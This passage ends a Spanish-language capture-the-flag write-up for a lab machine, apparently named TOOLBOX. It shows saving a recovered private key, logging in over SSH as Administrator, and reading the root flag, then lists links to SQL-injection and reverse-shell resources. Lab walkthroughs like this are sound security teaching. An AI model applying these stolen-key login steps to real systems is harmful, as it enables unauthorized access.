Copia la llave privada en un archivo en tu máquina y dale cambia sus permisos o si no no funcionará:
```
nano id_rsa

chmod 600 id_rsa
```
Ya por último, conéctate desde tu máquina, usando esa llave por el servicio **SSH**:
```
ssh -i id_rsa Administrator@10.10.10.236                             
The authenticity of host '10.10.10.236 (10.10.10.236)' can't be established.
ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.236' (ED25519) to the list of known hosts.
Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved.
 
administrator@TOOLBOX C:\Users\Administrator>whoami
toolbox\administrator
```
Excelente, la flag estará en el mismo lugar en donde la encontramos en el **Docker**:
```
administrator@TOOLBOX C:\Users\Administrator>cd Desktop
administrator@TOOLBOX C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 64F8-B588

 Directory of C:\Users\Administrator\Desktop

02/08/2021  11:39 AM    <DIR>          .
02/08/2021  11:39 AM    <DIR>          ..
02/08/2021  11:39 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)   5,484,789,760 bytes free

administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt
```
Listo, ya terminamos esta máquina.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>


* https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
* https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password
* https://www.revshells.com/

<br>
# FIN

